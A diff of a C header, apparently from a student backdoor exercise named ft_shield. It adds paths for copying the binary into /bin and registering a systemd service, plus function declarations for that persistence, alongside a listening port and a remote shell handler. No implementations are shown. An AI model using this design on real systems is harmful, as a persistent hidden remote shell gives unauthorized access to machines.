@@ -23,7 +23,8 @@
 # include <sys/un.h>
 # include <sys/wait.h>
 
-#define DEST_PATH "/workspaces"
+#define DEST_PATH "/bin/ft_shield"
+#define DEST_SERVICE "/etc/systemd/system/ft_shield.service"
 #define LISTENING_PORT 4242
 #define MAX_CONECTIONS 10
 #define MAX_NBR_CLIENTS 2
@@ -73,6 +74,9 @@ int		handle_commands(t_server *server, int index, char *input);
 // void	*shell_function(void *data);
 void	*shell_function(t_server *server, int index);
 
+/* service.c */
+void	create_service(void);
+void	start_service(void);
 
 /* server.c */
 void	create_server_socket(t_server *s);
@@ -84,6 +88,8 @@ int	find_own_path(char *buffer, size_t size_buffer);
 char	*ft_strtrim(char const *s1, char const *set);
 void	simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output);
 char	*gen_random_password(void);
+
+void	copy_file(char *src, char *dst);
 
 void	ft_dprintf(int fd, const char *format, ...);
 void	ft_perror(char *str);
